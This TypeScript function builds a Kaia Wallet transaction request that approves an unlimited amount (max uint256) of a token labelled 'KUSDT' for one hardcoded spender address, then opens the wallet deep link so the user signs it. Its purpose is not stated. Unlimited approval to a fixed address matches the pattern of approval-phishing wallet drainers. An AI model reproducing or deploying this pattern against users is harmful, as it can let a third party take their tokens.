import axios from 'axios';
import {abi} from './erc20.ts'

const MAX_UINT256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';


export const kaiaWalletApprove = async (): Promise<void> => {


    try {
        const res = await axios.post(
            'https://api.kaiawallet.io/api/v1/k/prepare',
            // '{\n  "type": "execute_contract",\n  "bapp": {\n    "name": "test app",\n    "callback": {\n      "success": "https://www.google.com/search?q=success",\n      "fail": "https://www.google.com/search?q=fail"\n    }\n  },\n  "transaction": {\n    "abi": "{\\n  \\"constant\\": false,\\n  \\"inputs\\": [\\n    {\\n      \\"name\\": \\"_to\\",\\n      \\"type\\": \\"address\\"\\n    },\\n    {\\n      \\"name\\": \\"_value\\",\\n      \\"type\\": \\"uint256\\"\\n    }\\n  ],\\n  \\"name\\": \\"transfer\\",\\n  \\"outputs\\": [\\n    {\\n      \\"name\\": \\"\\",\\n      \\"type\\": \\"bool\\"\\n    }\\n  ],\\n  \\"payable\\": false,\\n  \\"stateMutability\\": \\"nonpayable\\",\\n  \\"type\\": \\"function\\"\\n}",\n    "value": "0",\n    "to": "0x5c74070fdea071359b86082bd9f9b3deaafbe32b",\n    "params": "[\\"0x0000000000000000000000000000000000000000\\", \\"0\\"]"\n  }\n}',
            {
                'type': 'execute_contract',
                'bapp': {
                    'name': 'KUSDT',
                    'callback': {
                        'success': 'https://www.google.com/search?q=success',
                        'fail': 'https://www.google.com/search?q=fail'
                    }
                },
                'transaction': {
                    'abi': "{\n" +
                        "    \"constant\": false,\n" +
                        "    \"inputs\": [\n" +
                        "      { \"name\": \"spender\", \"type\": \"address\" },\n" +
                        "      { \"name\": \"amount\", \"type\": \"uint256\" }\n" +
                        "    ],\n" +
                        "    \"name\": \"approve\",\n" +
                        "    \"outputs\": [{ \"name\": \"\", \"type\": \"bool\" }],\n" +
                        "    \"type\": \"function\"\n" +
                        "  }",
                    "value": "0",
                    'to': '0x5c13e303a62fc5dedf5b52d66873f2e59fedadc2',
                    'params': '["0x48F943a8a6A6437117063D3aCaf62e2047467966", "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"]'
                }
            },
            {
                headers: {
                    'Content-Type': 'application/json; charset=utf-8'
                }
            }
        );

        window.open(`kaikas://wallet/api?request_key=${res.data.request_key}`);

    } catch (error) {
        console.error(" 交易失败:", error);
        throw error; // 抛出错误
    }


}
